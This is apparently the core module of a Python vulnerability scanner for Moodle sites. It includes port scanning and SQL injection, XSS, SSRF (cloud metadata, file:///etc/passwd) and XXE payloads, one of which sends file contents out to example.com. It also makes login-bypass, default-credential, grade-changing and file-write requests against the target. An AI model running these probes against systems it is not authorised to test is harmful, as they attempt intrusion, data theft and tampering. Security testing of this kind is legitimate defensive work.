# scanner_core.py
import requests
import urllib3
import re
import time
import xml.etree.ElementTree as ET
import random
import string
import json
import os
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from concurrent.futures import ThreadPoolExecutor
import threading
import socket
from config import Config

from datetime import datetime
from risk_analyzer import RiskAnalyzer

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MoodleScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': Config.USER_AGENT})
        self.session.verify = False
        self.timeout = Config.DEFAULT_TIMEOUT
        self.results = []
        self.lock = threading.Lock()
        
    def test_endpoint(self, endpoint):
        """Test individual endpoint for common vulnerabilities"""
        url = urljoin(self.target_url, endpoint)
        findings = []
        
        try:
            # Test for directory listing
            response = self.session.get(url, timeout=self.timeout)
            
            if response.status_code == 200:
                # Check for directory listing
                if self._check_directory_listing(response.text):
                    findings.append({
                        'type': 'Directory Listing',
                        'severity': 'Medium',
                        'url': url,
                        'description': 'Directory listing is enabled'
                    })
                
                # Check for exposed files
                if self._check_exposed_files(response.text):
                    findings.append({
                        'type': 'Exposed Files',
                        'severity': 'Low',
                        'url': url,
                        'description': 'Sensitive files might be exposed'
                    })
                    
        except Exception as e:
            pass
            
        return findings
    
    def _check_directory_listing(self, content):
        """Check if directory listing is enabled"""
        indicators = [
            "Index of /",
            "Parent Directory",
            "Directory listing for"
        ]
        return any(indicator in content for indicator in indicators)
    
    def _check_exposed_files(self, content):
        """Check for exposed sensitive files"""
        file_patterns = [
            r'\.bak"', r'\.sql"', r'\.log"', r'\.old"',
            r'config', r'backup', r'database'
        ]
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in file_patterns)
    
    def scan_ports(self):
        """Scan common ports on the target server"""
        findings = []
        parsed_url = urlparse(self.target_url)
        hostname = parsed_url.hostname
        
        try:
            # Resolve IP address
            ip_address = socket.gethostbyname(hostname)
            findings.append({
                'type': 'Target Information',
                'severity': 'Info',
                'url': self.target_url,
                'description': f'Target IP Address: {ip_address}'
            })
        except socket.gaierror:
            ip_address = hostname
            findings.append({
                'type': 'Target Information',
                'severity': 'Info',
                'url': self.target_url,
                'description': f'Could not resolve IP for: {hostname}'
            })
        
        # Common ports to scan
        common_ports = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt'
        }
        
        open_ports = []
        
        def check_port(port, service):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip_address, port))
                sock.close()
                if result == 0:
                    return (port, service)
            except:
                pass
            return None
        
        # Scan ports concurrently
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_port, port, service) 
                      for port, service in common_ports.items()]
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        
        # Sort by port number
        open_ports.sort(key=lambda x: x[0])
        
        if open_ports:
            ports_info = ', '.join([f"{port}/{service}" for port, service in open_ports])
            findings.append({
                'type': 'Open Ports',
                'severity': 'Info',
                'url': self.target_url,
                'description': f'Open ports detected: {ports_info}'
            })
            
            # Flag potentially risky open ports
            risky_ports = {21: 'FTP', 23: 'Telnet', 3389: 'RDP', 445: 'SMB'}
            for port, service in open_ports:
                if port in risky_ports:
                    findings.append({
                        'type': 'Risky Open Port',
                        'severity': 'Medium',
                        'url': self.target_url,
                        'description': f'Potentially risky port {port} ({service}) is open'
                    })
        else:
            findings.append({
                'type': 'Port Scan',
                'severity': 'Info',
                'url': self.target_url,
                'description': 'No common ports detected (may be filtered by firewall)'
            })
        
        return findings
    
    def scan_sql_injection(self):
        """Test for SQL injection vulnerabilities with advanced detection"""
        test_points = [
            "/user/profile.php?id=1",
            "/course/view.php?id=1",
            "/mod/forum/view.php?f=1",
            "/mod/assign/view.php?id=1",
            "/mod/quiz/view.php?id=1",
            "/mod/resource/view.php?id=1"
        ]
        
        payloads = [
            # Basic SQLi
            "'", '"', '`',
            # Boolean-based blind
            "1' AND 1=1--", "1' AND 1=2--",
            # Time-based blind
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            # Stacked queries
            "1'; SELECT PG_SLEEP(5)--",
            # Error-based
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            # Union-based
            "1' UNION SELECT 1,2,3,4,5--",
            # Alternative encodings
            "%27%20OR%201=1--",
            # Second-order SQLi
            "1' OR '1'='1"
        ]
        
        findings = []
        for point in test_points:
            for payload in payloads:
                test_url = f"{self.target_url}{point}{payload}"
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    if self._detect_sql_errors(response.text):
                        findings.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'url': test_url,
                            'description': f'Possible SQL injection at {point}'
                        })
                        break
                except (requests.RequestException, ValueError, KeyError):
                    pass
                    
        return findings
    
    def _detect_sql_errors(self, content):
        """Detect SQL error messages in response"""
        sql_errors = [
            "You have an error in your SQL syntax",
            "Warning: mysql",
            "ORA-",  # Oracle errors
            "Microsoft OLE DB Provider",
            "PostgreSQL query failed"
        ]
        return any(error in content for error in sql_errors)
    
    def scan_xss(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities including DOM-based XSS"""
        test_points = [
            "/search/index.php?q=",
            "/user/profile.php?search=",
            "/mod/forum/search.php?search=",
            "/mod/chat/gui_ajax/index.php?message=",
            "/mod/glossary/showentry.php?eid=1&displayformat=dictionary&concept="
        ]
        
        # Various XSS payloads for different contexts
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            # Event handlers
            '" onmouseover="alert(1)"',
            # SVG XSS
            '<svg/onload=alert(1)>',
            # JavaScript URIs
            'javascript:alert(1)',
            # DOM-based XSS
            '"><script>alert(1)</script>',
            # HTML5 vectors
            '<img src=x onerror=alert(1)>',
            # Unicode XSS
            '\x3cscript\x3ealert(1)\x3c/script\x3e',
            # DOM clobbering
            '<form id=x tabindex=1 onfocus=alert(1)><input autofocus>'
        ]
        
        findings = []
        
        # Test reflected XSS
        for point in test_points:
            for payload in payloads:
                test_url = f"{self.target_url}{point}{requests.utils.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    # Check for reflected payload in different contexts
                    if (payload in response.text or 
                        payload.replace('"', '&quot;') in response.text or
                        payload.replace('"', '&amp;quot;') in response.text):
                        findings.append({
                            'type': 'Reflected Cross-Site Scripting (XSS)',
                            'severity': 'Medium',
                            'url': test_url,
                            'description': f'Possible XSS vulnerability at {point}'
                        })
                        break
                except:
                    continue
        
        # Test for DOM-based XSS in JavaScript
        dom_checks = [
            ("document.cookie", "document.cookie"),
            ("location.hash", "<script>eval(location.hash.slice(1))</script>#alert(1)"),
            ("document.write", "<script>document.write(location.search.slice(1))</script>?<script>alert(1)</script>")
        ]
        
        for var_name, payload in dom_checks:
            try:
                response = self.session.get(f"{self.target_url}/lib/javascript-static.js", timeout=self.timeout)
                if response.status_code == 200 and var_name in response.text:
                    findings.append({
                        'type': 'Potential DOM-based XSS',
                        'severity': 'Medium',
                        'url': f"{self.target_url}/lib/javascript-static.js",
                        'description': f'Potential DOM-based XSS vector found using {var_name}'
                    })
            except:
                continue
                
        return findings
    
    def scan_csrf(self):
        """Test for Cross-Site Request Forgery (CSRF) vulnerabilities"""
        findings = []
        
        # Check for CSRF tokens in forms
        try:
            login_page = self.session.get(f"{self.target_url}/login/index.php", timeout=self.timeout)
            if login_page.status_code == 200:
                soup = BeautifulSoup(login_page.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    # Check for CSRF token
                    if not (form.find('input', {'name': 'sesskey'}) or 
                           form.find('input', {'name': '_qf__'}) or
                           form.find('input', {'name': 'csrf_token'}) or
                           form.find('input', {'name': 'csrfmiddlewaretoken'}) or
                           form.find('input', {'name': 'authenticity_token'}) or
                           form.find('input', {'name': re.compile('token', re.I)})):
                        
                        # Check if form has sensitive actions
                        form_action = form.get('action', '').lower()
                        sensitive_actions = ['delete', 'edit', 'update', 'add', 'remove', 'install', 'uninstall']
                        
                        if any(action in form_action for action in sensitive_actions):
                            findings.append({
                                'type': 'Missing CSRF Protection',
                                'severity': 'High',
                                'url': f"{self.target_url}/login/index.php",
                                'description': f'Form at {form_action} may be vulnerable to CSRF - no CSRF token found'
                            })
        except Exception as e:
            pass
            
        return findings
    
    def scan_ssrf(self):
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities"""
        findings = []
        
        # Common SSRF test endpoints
        test_endpoints = [
            "/lib/editor/atto/plugins/emoticon/dialogue.php?image=test",
            "/lib/editor/tinymce/plugins/moodlemedia/plugin.min.js?file=test",
            "/lib/editor/atto/plugins/emoticons.php?image=test"
        ]
        
        # Internal IPs and services to test for SSRF
        test_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254',  # AWS metadata service
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'gopher://127.0.0.1:22'
        ]
        
        for endpoint in test_endpoints:
            for payload in test_payloads:
                test_url = f"{self.target_url}{endpoint}{payload}"
                try:
                    response = self.session.get(test_url, timeout=10, allow_redirects=False)
                    
                    # Check for indicators of successful SSRF
                    if response.status_code in [200, 201, 202, 302, 307, 400, 403, 500]:
                        content = response.text.lower()
                        indicators = [
                            'root:', 'daemon:', 'bin/', 'sys/', 'admin',
                            'amazon', 'aws', 'ec2', 'metadata', 'internal',
                            'microsoft azure', 'google cloud', 'gce',
                            'passwd', 'shadow', 'group', 'hostname', 'id_rsa'
                        ]
                        
                        if any(indicator in content for indicator in indicators):
                            findings.append({
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'High',
                                'url': test_url,
                                'description': f'Possible SSRF vulnerability at {endpoint} - Detected internal service response'
                            })
                            break
                except:
                    continue
                    
        return findings
    
    def scan_xxe(self):
        """Test for XML External Entity (XXE) Injection vulnerabilities"""
        findings = []
        
        # Common endpoints that might process XML
        test_endpoints = [
            "/webservice/rest/server.php",
            "/lib/editor/tinymce/plugins/media/moxieplayer.swf",
            "/lib/editor/atto/plugins/recordrtc/recordrtc.php"
        ]
        
        # XXE payloads
        payloads = [
            # Basic XXE
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>''',
            
            # Blind XXE
            '''<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
            <!ENTITY callhome SYSTEM "http://example.com/?%xxe;" >
            ]>
            <foo>&callhome;</foo>'''
        ]
        
        headers = {
            'Content-Type': 'application/xml',
            'Accept': 'application/xml'
        }
        
        for endpoint in test_endpoints:
            for payload in payloads:
                test_url = f"{self.target_url}{endpoint}"
                try:
                    response = self.session.post(test_url, data=payload, headers=headers, timeout=10)
                    
                    # Check for indicators of successful XXE
                    if response.status_code in [200, 400, 500]:
                        content = response.text
                        indicators = [
                            'root:', 'daemon:', 'bin/', 'sys/', 'admin',
                            'nologin', '/bin/bash', '/bin/false'
                        ]
                        
                        if any(indicator in content for indicator in indicators):
                            findings.append({
                                'type': 'XML External Entity (XXE) Injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'description': f'Possible XXE vulnerability at {endpoint} - Detected file content in response'
                            })
                            break
                except:
                    continue
                    
        return findings
    
    def check_auth_bypass(self):
        """Check for authentication bypass vulnerabilities"""
        findings = []
        test_endpoints = [
            ("/login/token.php?username=admin", "POST", {"password": "' OR '1'='1"}),
            ("/login/index.php", "POST", {"username": "admin", "password": "' OR '1'='1"}),
            ("/auth/ldap/ntlmsso_finish.php", "GET", {}),
            ("/auth/oauth2/login.php", "GET", {}),
            ("/admin/upgradesettings.php", "GET", {})
        ]
        
        for endpoint, method, data in test_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                if method == "POST":
                    response = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)
                else:
                    response = self.session.get(url, params=data, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code in [200, 302, 403]:
                    if "MoodleSession" in response.cookies or "login" not in response.url:
                        findings.append({
                            'type': 'Authentication Bypass',
                            'severity': 'Critical',
                            'url': url,
                            'description': f'Possible authentication bypass at {endpoint}'
                        })
            except:
                continue
        
        return findings
    
    def check_privilege_escalation(self):
        """Check for privilege escalation vulnerabilities"""
        findings = []
        
        # Test admin access without proper privileges
        admin_endpoints = [
            "/admin/user.php?mode=edit&user=2",  # Editing another user
            "/admin/roles/assign.php?contextid=1&roleid=1",  # Assigning admin role
            "/admin/settings.php?section=sitepolicies",  # Site policies
            "/admin/tool/installaddon/index.php"  # Plugin installation
        ]
        
        for endpoint in admin_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code == 200 and ("Access denied" not in response.text and "You do not have permission" not in response.text):
                    findings.append({
                        'type': 'Privilege Escalation',
                        'severity': 'High',
                        'url': url,
                        'description': f'Possible privilege escalation at {endpoint} - Unauthorized access might be possible'
                    })
            except:
                continue
        
        return findings
    
    def check_enrollment_vulnerabilities(self):
        """Check for course enrollment vulnerabilities"""
        findings = []
        
        # Test self-enrollment without proper checks
        test_endpoints = [
            "/enrol/self/enrol.php?enrolid=1",  # Self-enrollment
            "/enrol/guest/instance.php?id=1",   # Guest access
            "/enrol/manual/enrolusers.php"      # Manual enrollment
        ]
        
        for endpoint in test_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = self.session.post(url, data={"enrol": "1"}, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code == 200 and "success" in response.text.lower():
                    findings.append({
                        'type': 'Unauthorized Enrollment',
                        'severity': 'High',
                        'url': url,
                        'description': f'Possible unauthorized course enrollment at {endpoint}'
                    })
            except:
                continue
        
        return findings
    
    def check_grade_manipulation(self):
        """Check for grade manipulation vulnerabilities"""
        findings = []
        
        test_endpoints = [
            ("/grade/edit/tree/grade.php?courseid=1", "POST", {"id": "1", "grade": "100"}),
            ("/grade/report/grader/index.php?userid=1", "POST", {"grades[1][1]": "100"}),
            ("/mod/assign/view.php?id=1&action=editsubmission", "POST", {"grade": "100"})
        ]
        
        for endpoint, method, data in test_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                if method == "POST":
                    response = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)
                else:
                    response = self.session.get(url, params=data, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code == 200 and ("success" in response.text.lower() or "grade saved" in response.text.lower()):
                    findings.append({
                        'type': 'Grade Manipulation',
                        'severity': 'High',
                        'url': url,
                        'description': f'Possible grade manipulation at {endpoint}'
                    })
            except:
                continue
        
        return findings
    
    def check_plugin_vulnerabilities(self):
        """Check for known plugin vulnerabilities"""
        findings = []
        
        # Known vulnerable plugins and their endpoints
        vulnerable_plugins = [
            {
                'name': 'mod_attendance',
                'endpoint': '/mod/attendance/export.php',
                'vulnerable_versions': ['3.0.0', '3.1.0', '3.2.0'],
                'type': 'File Disclosure',
                'severity': 'High'
            },
            {
                'name': 'mod_quiz',
                'endpoint': '/mod/quiz/startattempt.php',
                'vulnerable_versions': ['3.0.0', '3.1.0', '3.2.0'],
                'type': 'CSRF',
                'severity': 'Medium'
            },
            {
                'name': 'mod_forum',
                'endpoint': '/mod/forum/post.php',
                'vulnerable_versions': ['3.0.0', '3.1.0', '3.2.0'],
                'type': 'XSS',
                'severity': 'Medium'
            }
        ]
        
        # Get Moodle version for version-specific checks
        moodle_version = self.check_moodle_version()
        
        for plugin in vulnerable_plugins:
            try:
                url = f"{self.target_url}{plugin['endpoint']}"
                response = self.session.head(url, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code == 200:
                    # Check if version is vulnerable
                    version_vulnerable = any(ver in moodle_version for ver in plugin['vulnerable_versions'])
                    
                    findings.append({
                        'type': f'Vulnerable Plugin: {plugin["name"]}',
                        'severity': plugin['severity'],
                        'url': url,
                        'description': f'Potential {plugin["type"]} vulnerability in {plugin["name"]}.' + 
                                     (f' Version {moodle_version} may be vulnerable.' if version_vulnerable else '')
                    })
            except:
                continue
        
        return findings
    
    def check_database_weaknesses(self):
        """Check for database schema weaknesses"""
        findings = []
        
        # Common database information disclosure endpoints
        db_test_endpoints = [
            "/admin/tool/installaddon/validate.php?download=1&url=1",
            "/lib/editor/atto/plugins/emoticon/db/install.xml",
            "/lib/editor/tinymce/db/install.xml"
        ]
        
        for endpoint in db_test_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code == 200 and ('<TABLE' in response.text or 'CREATE TABLE' in response.text):
                    findings.append({
                        'type': 'Database Information Disclosure',
                        'severity': 'Medium',
                        'url': url,
                        'description': f'Possible database schema disclosure at {endpoint}'
                    })
            except:
                continue
        
        # Check for default database credentials
        default_creds = [
            ('root', ''),  # Default MySQL root with no password
            ('moodle', 'moodle'),
            ('admin', 'admin'),
            ('user', 'user')
        ]
        
        for user, pwd in default_creds:
            try:
                # This is a simple test - in a real scenario, you'd need more sophisticated checks
                test_url = f"{self.target_url}/config.php"
                response = self.session.get(test_url, auth=(user, pwd), timeout=self.timeout)
                
                if response.status_code == 200:
                    findings.append({
                        'type': 'Default Credentials',
                        'severity': 'Critical',
                        'url': test_url,
                        'description': f'Possible default credentials found: {user}:{pwd}'
                    })
            except:
                continue
        
        return findings
    
    def check_file_permissions(self):
        """Check for file permission misconfigurations"""
        findings = []
        
        # Check world-writable directories
        sensitive_dirs = [
            "/moodledata",
            "/moodledata/cache",
            "/moodledata/sessions",
            "/moodledata/temp",
            "/config.php"
        ]
        
        for directory in sensitive_dirs:
            try:
                url = f"{self.target_url}{directory}"
                # Test if we can write to the directory
                test_file = f"{url}/.test_{int(time.time())}"
                response = self.session.put(test_file, data="test", timeout=self.timeout)
                
                if response.status_code in [200, 201, 204]:
                    findings.append({
                        'type': 'Insecure File Permissions',
                        'severity': 'High',
                        'url': url,
                        'description': f'World-writable directory or file found: {directory}'
                    })
                    # Clean up test file if created
                    try:
                        self.session.delete(test_file)
                    except:
                        pass
            except:
                continue
        
        return findings
    
    def scan_info_disclosure(self):
        """Scan for information disclosure"""
        sensitive_files = [
            "/config.php",
            "/database/moodle.sql",
            "/backup/backup.log",
            "/.git/config",
            "/.git/HEAD",
            "/.env",
            "/.htaccess",
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/db/backup.sql",
            "/moodle/config.php",
            "/moodledata/logs/error.log",
            "/moodledata/sessions/sess_*",
            "/moodledata/trashdir/.htaccess",
            "/moodledata/upgrade.txt",
            "/moodledata/upgrade_backup.html"
        ]
        
        findings = []
        for file in sensitive_files:
            url = urljoin(self.target_url, file)
            try:
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    findings.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'url': url,
                        'description': f'Sensitive file exposed: {file}'
                    })
            except:
                pass
                
        return findings
    
    def check_moodle_version(self):
        """Attempt to identify Moodle version"""
        version_indicators = [
            "/lib/upgrade.txt",
            "/version.php",
            "/README.txt"
        ]
        
        for indicator in version_indicators:
            url = urljoin(self.target_url, indicator)
            try:
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    # Extract version information
                    version_match = re.search(r'version\s*=\s*[\'"]?(\d+\.\d+(?:\.\d+)?)', response.text, re.IGNORECASE)
                    if version_match:
                        return version_match.group(1)
            except:
                pass
                
        return "Unknown"
    
    def comprehensive_scan(self, output_report=None, report_format='pdf'):
        """
        Run comprehensive vulnerability scan with all checks
        
        Args:
            output_report (str, optional): Path to save the report. If None, no report is generated.
            report_format (str): Format of the report ('pdf', 'json', or 'txt')
            
        Returns:
            dict: Scan results including findings and metadata
        """
        print(f"Starting comprehensive scan of {self.target_url}")
        start_time = datetime.now()
        
        all_findings = []
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        
        def safe_extend(findings):
            """Safely extend the findings list with thread safety"""
            if findings:
                with self.lock:
                    all_findings.extend(findings)
        
        try:
            # Get Moodle version
            print("Checking Moodle version...")
            version = self.check_moodle_version()
            safe_extend([{
                'type': 'Information',
                'severity': 'Info',
                'url': self.target_url,
                'description': f'Moodle Version: {version}',
                'timestamp': current_time
            }])
            
            # Scan ports and get IP information
            print("Scanning ports and resolving IP...")
            port_findings = self.scan_ports()
            if port_findings:
                for finding in port_findings:
                    finding['timestamp'] = current_time
                safe_extend(port_findings)
            
            # Scan common endpoints
            print("Scanning common endpoints...")
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.test_endpoint, path) for path in Config.COMMON_PATHS]
                for future in futures:
                    try:
                        findings = future.result()
                        if findings:
                            for finding in findings:
                                finding['timestamp'] = current_time
                            safe_extend(findings)
                    except Exception as e:
                        print(f"Error scanning endpoint: {str(e)}")
            
            # Run security scans with error handling
            scan_methods = [
                ("SQL Injection", self.scan_sql_injection),
                ("Cross-Site Scripting (XSS)", self.scan_xss),
                ("Cross-Site Request Forgery (CSRF)", self.scan_csrf),
                ("Server-Side Request Forgery (SSRF)", self.scan_ssrf),
                ("XML External Entity (XXE)", self.scan_xxe),
                ("Authentication Bypass", self.check_auth_bypass),
                ("Privilege Escalation", self.check_privilege_escalation),
                ("Course Enrollment", self.check_enrollment_vulnerabilities),
                ("Grade Manipulation", self.check_grade_manipulation),
                ("Plugin Vulnerabilities", self.check_plugin_vulnerabilities),
                ("Database Weaknesses", self.check_database_weaknesses),
                ("File Permissions", self.check_file_permissions),
                ("Information Disclosure", self.scan_info_disclosure)
            ]
            
            for scan_name, scan_method in scan_methods:
                print(f"Testing for {scan_name}...")
                try:
                    findings = scan_method()
                    if findings:
                        for finding in findings:
                            finding['timestamp'] = current_time
                        safe_extend(findings)
                    time.sleep(1)  # Add small delay between different scan types
                except Exception as e:
                    print(f"Error during {scan_name} scan: {str(e)}")
                    safe_extend([{
                        'type': 'Scan Error',
                        'severity': 'High',
                        'url': self.target_url,
                        'description': f'Error during {scan_name} scan: {str(e)}',
                        'timestamp': current_time
                    }])
            
        except Exception as e:
            print(f"Critical error during scan: {str(e)}")
            safe_extend([{
                'type': 'Critical Error',
                'severity': 'Critical',
                'url': self.target_url,
                'description': f'Critical error during scan: {str(e)}',
                'timestamp': current_time
            }])
        
        # Calculate scan duration
        end_time = datetime.now()
        scan_duration = (end_time - start_time).total_seconds()
        
        # Prepare results
        results = {
            'target': self.target_url,
            'start_time': start_time.isoformat(),
            'end_time': end_time.isoformat(),
            'duration_seconds': scan_duration,
            'findings': all_findings,
            'summary': {
                'total_findings': len(all_findings),
                'by_severity': {
                    'Critical': len([f for f in all_findings if f.get('severity') == 'Critical']),
                    'High': len([f for f in all_findings if f.get('severity') == 'High']),
                    'Medium': len([f for f in all_findings if f.get('severity') == 'Medium']),
                    'Low': len([f for f in all_findings if f.get('severity') == 'Low']),
                    'Info': len([f for f in all_findings if f.get('severity') == 'Info'])
                }
            }
        }
        
        # Generate report if requested
        if output_report:
            analyzer = RiskAnalyzer(all_findings)
            report_path = analyzer.generate_report(output_format=report_format, output_file=output_report)
            print(f"Report generated: {report_path}")
            
            # Generate trend visualization if historical data is available
            try:
                historical_data = self._load_historical_data()
                if historical_data:
                    analyzer.plot_trends(historical_data, f"{output_report}_trends.png")
            except Exception as e:
                print(f"Warning: Could not generate trend visualization: {str(e)}")
        
        return results
    
    def _load_historical_data(self):
        """Load historical scan data for trend analysis"""
        history_file = os.path.join(os.path.dirname(__file__), 'scan_history.json')
        if os.path.exists(history_file):
            try:
                with open(history_file, 'r') as f:
                    return json.load(f)
            except:
                return []
        return []
    
    def _save_scan_results(self, results):
        """Save scan results to history"""
        try:
            history_file = os.path.join(os.path.dirname(__file__), 'scan_history.json')
            history = self._load_historical_data()
            
            # Add current scan to history
            history_entry = {
                'timestamp': datetime.now().isoformat(),
                'target': results['target'],
                'findings_count': results['summary']['total_findings'],
                'severity_breakdown': results['summary']['by_severity']
            }
            
            # Keep only the last 100 scans
            history = [history_entry] + history[:99]
            
            with open(history_file, 'w') as f:
                json.dump(history, f, indent=2)
                
        except Exception as e:
            print(f"Warning: Could not save scan history: {str(e)}")